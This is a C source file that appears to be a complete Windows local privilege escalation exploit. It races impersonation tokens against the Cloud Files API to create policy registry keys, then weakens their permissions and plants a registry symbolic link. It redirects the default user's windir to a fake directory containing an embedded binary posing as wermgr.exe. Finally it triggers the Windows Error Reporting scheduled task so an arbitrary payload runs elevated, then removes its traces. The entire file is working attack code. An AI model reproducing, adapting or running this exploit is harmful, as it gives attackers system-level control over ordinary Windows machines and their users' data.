#include <string.h>
#include <wchar.h>
#include <windows.h>
#include <winnt.h>
#include <winternl.h>

#include <combaseapi.h>
#include <initguid.h>
#include <pathcch.h>
#include <rpcdce.h>
#include <sddl.h>
#include <shlwapi.h>
#include <taskschd.h>

#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>

#include "mini_runner_data.h"

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

typedef LONG NTSTATUS;

#define STATUS_NO_MORE_ENTRIES ((NTSTATUS)0x8000001A)
#define STATUS_SUCCESS ((NTSTATUS)0x00000000)
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001)

#define TokenSessionId 12

#define ROOT_KEY L"\\Registry\\User\\.DEFAULT\\Software\\Policies\\Microsoft"
#define CLOUD_FILES ROOT_KEY "\\CloudFiles"
#define BLOCKED_APPS CLOUD_FILES "\\BlockedApps"
#define TARGET_KEY L"\\Registry\\User\\.DEFAULT\\Volatile Environment"

#define CONFIG_DIR L"C:\\ProgramData"

#define CHECK_HR(hr)                                                           \
  do {                                                                         \
    HRESULT _hr_temp = (hr);                                                   \
    if (FAILED(_hr_temp))                                                      \
      goto cleanup;                                                            \
  } while (0)

typedef HANDLE NtKey;
typedef ULONG SecurityInformation;

typedef enum _KEY_INFORMATION_CLASS {
  KeyBasicInformation = 0,
} KEY_INFORMATION_CLASS;

typedef struct _KEY_BASIC_INFORMATION {
  LARGE_INTEGER LastWriteTime;
  ULONG TitleIndex;
  ULONG NameLength;
  WCHAR Name[1];
} KEY_BASIC_INFORMATION, *PKEY_BASIC_INFORMATION;

typedef enum _AbortHydrationFlags {
  AbortHydrationFlagsNone = 0,
  AbortHydrationFlagsUnblock = 1,
  AbortHydrationFlagsBlock = 2,
} AbortHydrationFlags;

typedef struct _CF_PLATFORM_INFO {
  DWORD BuildNumber;
  DWORD RevisionNumber;
  DWORD IntegrationNumber;
} CF_PLATFORM_INFO;

typedef NTSTATUS(NTAPI *PNtOpenKey)(PHANDLE KeyHandle,
                                    ACCESS_MASK DesiredAccess,
                                    POBJECT_ATTRIBUTES ObjectAttributes);
typedef NTSTATUS(NTAPI *PNtImpersonateAnonymousToken)(HANDLE ThreadHandle);
typedef NTSTATUS(NTAPI *PNtSetTokenInformation)(
    HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass,
    PVOID TokenInformation, ULONG TokenInformationLength);
typedef NTSTATUS(NTAPI *PNtSetSecurityObject)(
    HANDLE Handle, SECURITY_INFORMATION SecurityInformation,
    PSECURITY_DESCRIPTOR SecurityDescriptor);
typedef NTSTATUS(NTAPI *PNtDeleteKey)(HANDLE KeyHandle);
typedef NTSTATUS(NTAPI *PNtEnumerateKey)(
    HANDLE KeyHandle, ULONG Index, KEY_INFORMATION_CLASS KeyInformationClass,
    PVOID KeyInformation, ULONG KeyInformationLength, PULONG ResultLength);
typedef NTSTATUS(NTAPI *PNtSetInformationThread)(
    HANDLE ThreadHandle, THREADINFOCLASS ThreadInformationClass,
    PVOID ThreadInformation, ULONG ThreadInformationLength);
typedef NTSTATUS(NTAPI *PNtNotifyChangeKey)(
    HANDLE KeyHandle, HANDLE EventHandle, PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcRoutineContext, PIO_STATUS_BLOCK IoStatusBlock, ULONG NotifyFilter,
    BOOLEAN WatchSubTree, PVOID RegChangeDataBuffer,
    ULONG RegChangeDataBufferLength, BOOLEAN Asynchronous);
typedef NTSTATUS(NTAPI *PNtCreateKey)(PHANDLE KeyHandle,
                                      ACCESS_MASK DesiredAccess,
                                      POBJECT_ATTRIBUTES ObjectAttributes,
                                      ULONG TitleIndex, PUNICODE_STRING Class,
                                      ULONG CreateOptions, PULONG Disposition);
typedef NTSTATUS(NTAPI *PNtSetValueKey)(HANDLE KeyHandle,
                                        PUNICODE_STRING ValueName,
                                        ULONG TitleIndex, ULONG Type,
                                        PVOID Data, ULONG DataSize);
typedef NTSTATUS(NTAPI *PNtSetInformationToken)(HANDLE TokenHandle,
                                                int TokenInformationClass,
                                                PVOID TokenInformation,
                                                ULONG TokenInformationLength);
typedef HRESULT(WINAPI *PCfAbortOperation)(DWORD pid, PVOID unknown,
                                           AbortHydrationFlags flags);
typedef HRESULT(WINAPI *PCfGetPlatformInfo)(CF_PLATFORM_INFO *info);

static volatile BOOL g_done = FALSE;
static WCHAR g_rid[16];
static WCHAR g_pipeName[64];
static WCHAR g_configDir[MAX_PATH];
static WCHAR g_payloadPath[MAX_PATH];

void ExecuteTask() {
  HRESULT hr = S_OK;
  ITaskService *pService = NULL;
  ITaskFolder *pRootFolder = NULL;
  IRegisteredTask *pRegisteredTask = NULL;
  IRunningTask *pRunningTask = NULL;

  hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
  if (FAILED(hr))
    return;

  hr = CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
                        &IID_ITaskService, (void **)&pService);
  CHECK_HR(hr);

  VARIANT varEmpty;
  VariantInit(&varEmpty);
  varEmpty.vt = VT_EMPTY;

  hr = pService->lpVtbl->Connect(pService, varEmpty, varEmpty, varEmpty,
                                 varEmpty);
  CHECK_HR(hr);

  BSTR folderPath =
      SysAllocString(L"\\Microsoft\\Windows\\Windows Error Reporting");
  hr = pService->lpVtbl->GetFolder(pService, folderPath, &pRootFolder);
  SysFreeString(folderPath);
  CHECK_HR(hr);

  BSTR taskName = SysAllocString(L"QueueReporting");
  hr = pRootFolder->lpVtbl->GetTask(pRootFolder, taskName, &pRegisteredTask);
  SysFreeString(taskName);
  CHECK_HR(hr);

  hr = pRegisteredTask->lpVtbl->Run(pRegisteredTask, varEmpty, &pRunningTask);
  CHECK_HR(hr);

cleanup:
  if (pRunningTask)
    pRunningTask->lpVtbl->Release(pRunningTask);
  if (pRegisteredTask)
    pRegisteredTask->lpVtbl->Release(pRegisteredTask);
  if (pRootFolder)
    pRootFolder->lpVtbl->Release(pRootFolder);
  if (pService)
    pService->lpVtbl->Release(pService);
  CoUninitialize();
}

NTSTATUS CreateRegistrySymbolicLink(LPCWSTR SymlinkPath, LPCWSTR TargetPath) {
  HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
  if (!hNtdll)
    return STATUS_DLL_NOT_FOUND;

  PNtCreateKey NtCreateKey =
      (PNtCreateKey)GetProcAddress(hNtdll, "NtCreateKey");
  PNtSetValueKey NtSetValueKey =
      (PNtSetValueKey)GetProcAddress(hNtdll, "NtSetValueKey");

  if (!NtCreateKey || !NtSetValueKey)
    return STATUS_ENTRYPOINT_NOT_FOUND;

  HANDLE hKey = NULL;
  UNICODE_STRING usSymlinkPath;
  OBJECT_ATTRIBUTES objAttr;
  usSymlinkPath.Buffer = (PWSTR)SymlinkPath;
  usSymlinkPath.Length = (USHORT)(wcslen(SymlinkPath) * sizeof(WCHAR));
  usSymlinkPath.MaximumLength = usSymlinkPath.Length + sizeof(WCHAR);

  InitializeObjectAttributes(&objAttr, &usSymlinkPath, OBJ_CASE_INSENSITIVE,
                             NULL, NULL);

  NTSTATUS status = NtCreateKey(&hKey, KEY_WRITE, &objAttr, 0, NULL,
                                REG_OPTION_CREATE_LINK, NULL);
  if (!NT_SUCCESS(status))
    return status;

  UNICODE_STRING usValueName;
  WCHAR valName[] = L"SymbolicLinkValue";
  usValueName.Buffer = valName;
  usValueName.Length = (USHORT)(wcslen(valName) * sizeof(WCHAR));
  usValueName.MaximumLength = usValueName.Length + sizeof(WCHAR);

  status = NtSetValueKey(hKey, &usValueName, 0, REG_LINK, (PVOID)TargetPath,
                         (ULONG)(wcslen(TargetPath) * sizeof(WCHAR)));

  CloseHandle(hKey);
  return status;
}
void DeleteRegistryTree(HANDLE hRoot);

HANDLE OpenKey(HANDLE hRoot, PCWSTR path, ACCESS_MASK desiredAccess) {
  UNICODE_STRING usPath;
  usPath.Buffer = (PWSTR)path;
  usPath.Length = (USHORT)(wcslen(path) * sizeof(WCHAR));
  usPath.MaximumLength = usPath.Length + sizeof(WCHAR);

  OBJECT_ATTRIBUTES objectAttributes;
  InitializeObjectAttributes(&objectAttributes, &usPath,
                             OBJ_CASE_INSENSITIVE | OBJ_OPENLINK, hRoot, NULL);
  HANDLE hKey = NULL;
  NTSTATUS status;

  HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");
  PNtOpenKey NtOpenKey = (PNtOpenKey)GetProcAddress(hNtDll, "NtOpenKey");
  PNtImpersonateAnonymousToken NtImpersonateAnonymousToken =
      (PNtImpersonateAnonymousToken)GetProcAddress(
          hNtDll, "NtImpersonateAnonymousToken");

  if (NtOpenKey == NULL || NtImpersonateAnonymousToken == NULL)
    return NULL;

  status = NtOpenKey(&hKey, desiredAccess, &objectAttributes);
  if (NT_SUCCESS(status))
    return hKey;

  status = NtImpersonateAnonymousToken(GetCurrentThread());
  if (NT_SUCCESS(status)) {
    status = NtOpenKey(&hKey, desiredAccess, &objectAttributes);
    RevertToSelf();
    if (NT_SUCCESS(status))
      return hKey;
  }

  return NULL;
}

void SetSecurityDescriptor(NtKey key, SecurityInformation info) {
  LPCWSTR sddl =
      L"D:(A;OICIIO;GA;;;WD)(A;OICIIO;GA;;;AN)(A;;GA;;;WD)(A;;GA;;;AN)"
      L"S:(ML;OICI;NW;;;S-1-16-0)";

  PSECURITY_DESCRIPTOR pRelSD = NULL;
  ULONG sdSize = 0;

  if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(
          sddl, SDDL_REVISION_1, &pRelSD, &sdSize))
    return;

  HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");
  if (!hNtDll) {
    LocalFree(pRelSD);
    return;
  }

  PNtSetSecurityObject NtSetSecurityObject =
      (PNtSetSecurityObject)GetProcAddress(hNtDll, "NtSetSecurityObject");
  if (!NtSetSecurityObject) {
    LocalFree(pRelSD);
    return;
  }

  PSECURITY_DESCRIPTOR pAbsSD = NULL;
  DWORD absSDSize = 0, daclSize = 0, saclSize = 0, ownerSize = 0,
        primGrpSize = 0;
  PACL pDacl = NULL;
  PACL pSacl = NULL;
  PSID pOwner = NULL;
  PSID pPrimGrp = NULL;

  MakeAbsoluteSD(pRelSD, NULL, &absSDSize, NULL, &daclSize, NULL, &saclSize,
                 NULL, &ownerSize, NULL, &primGrpSize);

  pAbsSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, absSDSize);
  pDacl = (PACL)LocalAlloc(LPTR, daclSize);
  pSacl = (PACL)LocalAlloc(LPTR, saclSize);
  pOwner = (PSID)LocalAlloc(LPTR, ownerSize);
  pPrimGrp = (PSID)LocalAlloc(LPTR, primGrpSize);

  if (pAbsSD && pDacl && pSacl && pOwner && pPrimGrp) {
    if (MakeAbsoluteSD(pRelSD, pAbsSD, &absSDSize, pDacl, &daclSize, pSacl,
                       &saclSize, pOwner, &ownerSize, pPrimGrp,
                       &primGrpSize)) {
      SecurityInformation sanitizedInfo = info & ~SACL_SECURITY_INFORMATION;
      NtSetSecurityObject(key, sanitizedInfo, pAbsSD);
    }
  }

  if (pAbsSD)
    LocalFree(pAbsSD);
  if (pDacl)
    LocalFree(pDacl);
  if (pSacl)
    LocalFree(pSacl);
  if (pOwner)
    LocalFree(pOwner);
  if (pPrimGrp)
    LocalFree(pPrimGrp);
  LocalFree(pRelSD);
}

BOOL ForceKeyDeleteKey(HANDLE hRoot, PCWSTR name) {
  HANDLE hKeyDac = OpenKey(hRoot, name, WRITE_DAC);
  if (hKeyDac != NULL) {
    SetSecurityDescriptor(hKeyDac, DACL_SECURITY_INFORMATION);
    CloseHandle(hKeyDac);
  }
  HANDLE hKeyOwner = OpenKey(hRoot, name, WRITE_OWNER);
  if (hKeyOwner != NULL) {
    SetSecurityDescriptor(hKeyOwner, LABEL_SECURITY_INFORMATION);
    CloseHandle(hKeyOwner);
  }
  HANDLE hKeyDelete = OpenKey(hRoot, name, DELETE | KEY_ENUMERATE_SUB_KEYS);
  if (hKeyDelete == NULL)
    return FALSE;

  DeleteRegistryTree(hKeyDelete);

  HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");
  if (hNtDll == NULL) {
    CloseHandle(hKeyDelete);
    return FALSE;
  }

  typedef NTSTATUS(NTAPI *PNtDeleteKey)(HANDLE KeyHandle);
  PNtDeleteKey pNtDeleteKey =
      (PNtDeleteKey)GetProcAddress(hNtDll, "NtDeleteKey");

  NTSTATUS status = STATUS_UNSUCCESSFUL;
  if (pNtDeleteKey != NULL)
    status = pNtDeleteKey(hKeyDelete);

  CloseHandle(hKeyDelete);
  return NT_SUCCESS(status);
}
void DeleteRegistryTree(HANDLE hRoot) {
  HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");
  if (hNtDll == NULL)
    return;

  PNtEnumerateKey NtEnumerateKey =
      (PNtEnumerateKey)GetProcAddress(hNtDll, "NtEnumerateKey");
  if (NtEnumerateKey == NULL)
    return;

  NTSTATUS status;
  ULONG ResultLength = 0;
  ULONG bufSize = sizeof(KEY_BASIC_INFORMATION) + MAX_PATH * sizeof(WCHAR);
  PKEY_BASIC_INFORMATION pKeyInfo = (PKEY_BASIC_INFORMATION)malloc(bufSize);
  if (pKeyInfo == NULL)
    return;

  ULONG subKeyIndex = 0;
  while (true) {
    status = NtEnumerateKey(hRoot, subKeyIndex, KeyBasicInformation, pKeyInfo,
                            bufSize, &ResultLength);
    if (status == STATUS_NO_MORE_ENTRIES)
      break;
    else if (NT_SUCCESS(status)) {
      WCHAR subKeyName[MAX_PATH];
      ULONG toCpy = pKeyInfo->NameLength / sizeof(WCHAR);
      if (toCpy > MAX_PATH)
        toCpy = MAX_PATH - 1;

      wcsncpy(subKeyName, pKeyInfo->Name, toCpy);
      subKeyName[toCpy] = L'\0';
      if (ForceKeyDeleteKey(hRoot, subKeyName))
        subKeyIndex = 0;
      else
        subKeyIndex++;
    } else
      break;
  }
  free(pKeyInfo);
}

DWORD WINAPI ForceTokenThread(LPVOID lpParameter) {
  HANDLE hTargetThread = (HANDLE)lpParameter;
  HANDLE hAnonToken = NULL;
  HANDLE hNullToken = NULL;
  HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");
  if (hNtDll == NULL)
    return 1;

  PNtSetInformationThread NtSetInformationThread =
      (PNtSetInformationThread)GetProcAddress(hNtDll,
                                              "NtSetInformationThread");
  if (NtSetInformationThread == NULL)
    return 1;

  if (!ImpersonateAnonymousToken(GetCurrentThread()))
    return 1;

  if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE,
                       &hAnonToken)) {
    RevertToSelf();
    return 1;
  }
  RevertToSelf();

  while (!g_done) {
    NtSetInformationThread(hTargetThread, 5, &hAnonToken, sizeof(HANDLE));
    NtSetInformationThread(hTargetThread, 5, &hNullToken, sizeof(HANDLE));
  }
  CloseHandle(hAnonToken);
  return 0;
}

DWORD WINAPI CheckKeyThread(LPVOID lpParameter) {
  bool useRootKey = (bool)lpParameter;
  HANDLE hKey = NULL, hEvent = NULL;
  NTSTATUS status;
  IO_STATUS_BLOCK iosb;

  HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");
  if (hNtDll == NULL)
    return 1;

  PNtOpenKey NtOpenKey = (PNtOpenKey)GetProcAddress(hNtDll, "NtOpenKey");
  PNtNotifyChangeKey NtNotifyChangeKey =
      (PNtNotifyChangeKey)GetProcAddress(hNtDll, "NtNotifyChangeKey");
  if (NtOpenKey == NULL || NtNotifyChangeKey == NULL)
    return 1;

  UNICODE_STRING uKeyName;
  PCWSTR targetPath = useRootKey ? ROOT_KEY : L"\\Registry\\User\\.DEFAULT";
  RtlInitUnicodeString(&uKeyName, targetPath);

  OBJECT_ATTRIBUTES objectAttributes;
  InitializeObjectAttributes(&objectAttributes, &uKeyName, OBJ_CASE_INSENSITIVE,
                             NULL, NULL);

  status = NtOpenKey(&hKey, KEY_NOTIFY, &objectAttributes);
  if (!NT_SUCCESS(status))
    return 1;

  hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
  while (!g_done) {
    status = NtNotifyChangeKey(hKey, hEvent, NULL, NULL, &iosb, 1, TRUE, NULL,
                               0, FALSE);
    if (status == STATUS_PENDING) {
      WaitForSingleObject(hEvent, INFINITE);
      g_done = TRUE;
      break;
    } else
      break;
  }

  CloseHandle(hEvent);
  CloseHandle(hKey);
  return 0;
}

void Stage1(BOOL root_key) {
  g_done = FALSE;

  HANDLE hThreadCheckKey =
      CreateThread(NULL, 0, CheckKeyThread, (LPVOID)(SIZE_T)root_key, 0, NULL);
  if (hThreadCheckKey == NULL)
    return;

  SetThreadPriority(hThreadCheckKey, THREAD_PRIORITY_BELOW_NORMAL);

  HANDLE hRealCurrentThread = NULL;
  BOOL bDupSuccess = DuplicateHandle(GetCurrentProcess(), GetCurrentThread(),
                                     GetCurrentProcess(), &hRealCurrentThread,
                                     0, FALSE, DUPLICATE_SAME_ACCESS);
  if (!bDupSuccess) {
    CloseHandle(hThreadCheckKey);
    return;
  }

  Sleep(1000);

  HANDLE hThreadForceToken = CreateThread(NULL, 0, ForceTokenThread,
                                          (LPVOID)hRealCurrentThread, 0, NULL);
  if (hThreadForceToken == NULL) {
    CloseHandle(hRealCurrentThread);
    CloseHandle(hThreadCheckKey);
    return;
  }
  SetThreadPriority(hThreadForceToken, THREAD_PRIORITY_BELOW_NORMAL);

  CloseHandle(hThreadCheckKey);
  CloseHandle(hThreadForceToken);

  HMODULE hCfApi = GetModuleHandleW(L"cfapi.dll");
  if (hCfApi == NULL)
    return;

  PCfAbortOperation CfAbortOperation =
      (PCfAbortOperation)GetProcAddress(hCfApi, "CfAbortOperation");
  if (CfAbortOperation == NULL)
    return;

  while (!g_done)
    CfAbortOperation(GetCurrentProcessId(), NULL, AbortHydrationFlagsBlock);
}

DWORD WINAPI Stage1Thread(LPVOID lpParameter) {
  Stage1((BOOL)(SIZE_T)lpParameter);
  return 0;
}

void Stage2() {
  HANDLE hCloudFilesKey = OpenKey(
      NULL, CLOUD_FILES, WRITE_DAC | WRITE_OWNER | KEY_ENUMERATE_SUB_KEYS);
  if (hCloudFilesKey == NULL)
    return;

  SetSecurityDescriptor(hCloudFilesKey,
                        DACL_SECURITY_INFORMATION | LABEL_SECURITY_INFORMATION);
  DeleteRegistryTree(hCloudFilesKey);
  CloseHandle(hCloudFilesKey);
  CreateRegistrySymbolicLink(BLOCKED_APPS, TARGET_KEY);
  Stage1(FALSE);
}

DWORD WINAPI Stage2Thread(LPVOID lpParameter) {
  (void)lpParameter;
  Stage2();
  return 0;
}

void Stage3() {
  HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");
  if (!hNtDll)
    return;

  PNtDeleteKey NtDeleteKey =
      (PNtDeleteKey)GetProcAddress(hNtDll, "NtDeleteKey");
  if (!NtDeleteKey)
    return;

  HANDLE hBlockedKey = OpenKey(NULL, BLOCKED_APPS, DELETE);
  if (hBlockedKey != NULL) {
    NtDeleteKey(hBlockedKey);
    CloseHandle(hBlockedKey);
  }

  HANDLE hTargetKey = OpenKey(NULL, TARGET_KEY, WRITE_DAC | WRITE_OWNER);
  if (hTargetKey != NULL) {
    SetSecurityDescriptor(hTargetKey, DACL_SECURITY_INFORMATION);
    CloseHandle(hTargetKey);
  }

  HKEY hKey2 = NULL;
  LPCWSTR volatileEnvPath = L".DEFAULT\\Volatile Environment";

  if (RegOpenKeyExW(HKEY_USERS, volatileEnvPath, 0,
                    KEY_READ | KEY_ENUMERATE_SUB_KEYS,
                    &hKey2) == ERROR_SUCCESS) {
    WCHAR subKeyName[MAX_PATH];
    DWORD nameSize = MAX_PATH;
    DWORD index = 0;

    while (RegEnumKeyExW(hKey2, index, subKeyName, &nameSize, NULL, NULL, NULL,
                         NULL) == ERROR_SUCCESS) {

      WCHAR fullSubKeyPath[MAX_PATH * 2];
      swprintf_s(fullSubKeyPath, MAX_PATH * 2, L"%s\\%s", TARGET_KEY,
                 subKeyName);

      HANDLE hSubKey = OpenKey(NULL, fullSubKeyPath, WRITE_DAC);
      if (hSubKey != NULL) {
        SetSecurityDescriptor(hSubKey, DACL_SECURITY_INFORMATION);
        CloseHandle(hSubKey);
        hSubKey = NULL;
        hSubKey = OpenKey(NULL, fullSubKeyPath, DELETE);
        if (hSubKey != NULL) {
          NtDeleteKey(hSubKey);
          CloseHandle(hSubKey);
        }
      }

      nameSize = MAX_PATH;
    }
    RegCloseKey(hKey2);
  }

  PNtSetValueKey NtSetValueKey =
      (PNtSetValueKey)GetProcAddress(hNtDll, "NtSetValueKey");
  if (NtSetValueKey == NULL)
    return;

  HANDLE hTarget = OpenKey(NULL, TARGET_KEY, KEY_SET_VALUE);
  if (hTarget != NULL) {
    UNICODE_STRING usValueName;
    usValueName.Buffer = L"windir";
    usValueName.Length = (USHORT)(wcslen(L"windir") * sizeof(WCHAR));
    usValueName.MaximumLength = usValueName.Length + sizeof(WCHAR);

    NtSetValueKey(hTarget, &usValueName, 0, REG_SZ, (PVOID)g_configDir,
                  (ULONG)((wcslen(g_configDir) + 1) * sizeof(WCHAR)));

    usValueName.Buffer = L"mp_pipe";
    usValueName.Length = (USHORT)(wcslen(L"mp_pipe") * sizeof(WCHAR));
    usValueName.MaximumLength = usValueName.Length + sizeof(WCHAR);
    NtSetValueKey(hTarget, &usValueName, 0, REG_SZ, (PVOID)g_pipeName,
                  (ULONG)((wcslen(g_pipeName) + 1) * sizeof(WCHAR)));

    usValueName.Buffer = L"mp_payload";
    usValueName.Length = (USHORT)(wcslen(L"mp_payload") * sizeof(WCHAR));
    usValueName.MaximumLength = usValueName.Length + sizeof(WCHAR);
    NtSetValueKey(hTarget, &usValueName, 0, REG_SZ, (PVOID)g_payloadPath,
                  (ULONG)((wcslen(g_payloadPath) + 1) * sizeof(WCHAR)));

    CloseHandle(hTarget);
  }

  WCHAR fakeSys32Path[MAX_PATH];
  wcscpy(fakeSys32Path, g_configDir);
  wcscat(fakeSys32Path, L"\\System32");
  CreateDirectoryW(fakeSys32Path, NULL);

  WCHAR fakeWerPath[MAX_PATH];
  wcscpy(fakeWerPath, fakeSys32Path);
  wcscat(fakeWerPath, L"\\wermgr.exe");

  HANDLE hWerFile =
      CreateFileW(fakeWerPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                  FILE_ATTRIBUTE_NORMAL, NULL);
  if (hWerFile != INVALID_HANDLE_VALUE) {
    DWORD written;
    WriteFile(hWerFile, build_mini_runner_exe, build_mini_runner_exe_len, &written,
              NULL);
    CloseHandle(hWerFile);
  }

  HANDLE hPipe = CreateNamedPipeW(g_pipeName, PIPE_ACCESS_DUPLEX,
                                   PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE |
                                       PIPE_WAIT,
                                   1, 0, 0, NMPWAIT_USE_DEFAULT_WAIT, NULL);
  if (hPipe == INVALID_HANDLE_VALUE)
    return;

  BOOL bConnected = ConnectNamedPipe(hPipe, NULL);
  if (!bConnected && GetLastError() != ERROR_PIPE_CONNECTED) {
    CloseHandle(hPipe);
    return;
  }

  ExecuteTask();

  BYTE inBuffer[1];
  DWORD bytesRead = 0;
  BOOL bReadSuccess =
      ReadFile(hPipe, inBuffer, sizeof(inBuffer), &bytesRead, NULL);

  if (bReadSuccess && bytesRead > 0)
    wprintf(L":)\n");
  else if (GetLastError() == ERROR_BROKEN_PIPE)
    wprintf(L":)\n");
  else
    wprintf(L":(\n");

  CloseHandle(hPipe);
  Sleep(1000);

  RemoveDirectoryW(fakeSys32Path);
  RemoveDirectoryW(g_configDir);

  HANDLE hTargetKeyDelete = OpenKey(NULL, TARGET_KEY, DELETE);
  if (hTargetKeyDelete == NULL)
    return;

  DeleteRegistryTree(hTargetKeyDelete);
  CloseHandle(hTargetKeyDelete);
}

static void GenerateRid() {
  GUID guid;
  UuidCreate(&guid);
  swprintf_s(g_rid, 16, L"%08lX", guid.Data1);
}

static void BuildPaths() {
  wcscpy(g_pipeName, L"\\\\.\\pipe\\WER_");
  wcscat(g_pipeName, g_rid);

  wcscpy(g_configDir, CONFIG_DIR);
  wcscat(g_configDir, L"\\mp_");
  wcscat(g_configDir, g_rid);

  CreateDirectoryW(g_configDir, NULL);
}

int main(int argc, char *argv[]) {
  if (argc >= 2)
    mbstowcs(g_payloadPath, argv[1], MAX_PATH);
  else
    wcscpy(g_payloadPath, L"C:\\Windows\\System32\\conhost.exe");

  HMODULE hCfApi = GetModuleHandleW(L"cfapi.dll");
  if (hCfApi == NULL)
    return 1;

  PCfGetPlatformInfo CfGetPlatformInfo =
      (PCfGetPlatformInfo)GetProcAddress(hCfApi, "CfGetPlatformInfo");
  if (CfGetPlatformInfo == NULL)
    return 1;

  CF_PLATFORM_INFO cfInfo;
  HRESULT hr = CfGetPlatformInfo(&cfInfo);
  CHECK_HR(hr);

  GenerateRid();
  BuildPaths();

  {
    HANDLE hThread =
        CreateThread(NULL, 0, Stage1Thread, (LPVOID)(SIZE_T)TRUE, 0, NULL);
    WaitForSingleObject(hThread, 15000);
    CloseHandle(hThread);
  }

  {
    HANDLE hThread = CreateThread(NULL, 0, Stage2Thread, NULL, 0, NULL);
    WaitForSingleObject(hThread, 15000);
    CloseHandle(hThread);
  }

  Stage3();

  return 0;

cleanup:
  return 1;
}
